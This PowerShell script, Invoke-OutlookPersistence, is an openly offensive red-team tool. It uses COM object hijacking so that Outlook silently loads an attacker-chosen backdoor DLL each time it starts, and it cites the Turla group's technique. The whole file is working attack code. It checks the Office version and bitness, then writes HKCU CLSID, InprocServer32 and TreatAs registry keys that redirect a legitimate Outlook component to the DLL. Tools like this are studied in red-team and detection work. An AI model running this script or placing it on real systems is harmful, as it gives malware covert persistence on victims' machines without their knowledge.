function Invoke-OutlookPersistence
{
<#
.SYNOPSIS
This script allows you to use COM Object hijacking to maintain persistence.
When the Outlook starts,it will load the backdoor DLL.
This method is first used by Turla in public.
Learn from:https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf
Code by: 3gstudent@3gstudent
License: BSD 3-Clause
Support x86 and x64 system.

.PARAMETER DLLPath
Specifies the path of the backdoor DLL.
.EXAMPLE
PS C:\> Invoke-OutlookPersistence -DLLPath c:\test\calc.dll
#>

 	param (
        [Parameter(Mandatory = $True)]
		[string]$DLLPath
	)
    
    $OfficePath = "C:\Program Files\Microsoft Office\"+"Office*"

    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
        Write-Host "[+] Microsoft Office Version:" $Ver    
    }  
    Catch  
    {  
        Write-Host "[!] I can't find Microsoft Office!" 
        Write-Host "[+] Please reset a correct path." 
        return 
    }   
    if ([IntPtr]::Size -eq 8)
    {
        Write-Host "[+] OS: x64"
       
        Try  
        {  
            $OfficeMainPath=$OfficePath.Substring(0,$OfficePath.LastIndexOf("\")+1)+"MEDIA"
            dir $OfficeMainPath -ErrorAction Stop | Out-Null 
            Write-Host "[+] Microsoft Office bit: 64-bit" 
            $RegPath="HKCU:Software\Classes\CLSID\"        
        }
        Catch  
        { 
            Write-Host "[+] Microsoft Office bit: 32-bit"
            $RegPath="HKCU:Software\Classes\Wow6432Node\CLSID\"
        }  
    }
    else
    {
        Write-Host "[+] OS: x86"
        $RegPath="HKCU:Software\Classes\CLSID\"
    }
    Write-Host "[*] Modifying registry...$RegPath"


    New-Item -type Directory $RegPath"{49CBB1C7-97D1-485A-9EC1-A26065633066}" | Out-Null
    New-Item -type Directory $RegPath"{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32" | Out-Null
    New-Item -type Directory $RegPath"{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}" | Out-Null
    New-Item -type Directory $RegPath"{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs" | Out-Null
    New-ItemProperty $RegPath"{49CBB1C7-97D1-485A-9EC1-A26065633066}" "(default)" -value "Mail Plugin" -propertyType string | Out-Null

    New-ItemProperty $RegPath"{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32" "(default)" -value $DLLPath -propertyType string | Out-Null
    New-ItemProperty $RegPath"{49CBB1C7-97D1-485A-9EC1-A26065633066}\InprocServer32" ThreadingModel -value "Apartment" -propertyType string | Out-Null
    New-ItemProperty $RegPath"{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs" "(default)" -value "{49CBB1C7-97D1-485A-9EC1-A26065633066}" -propertyType string | Out-Null
    Write-Host "[+] Done."
}
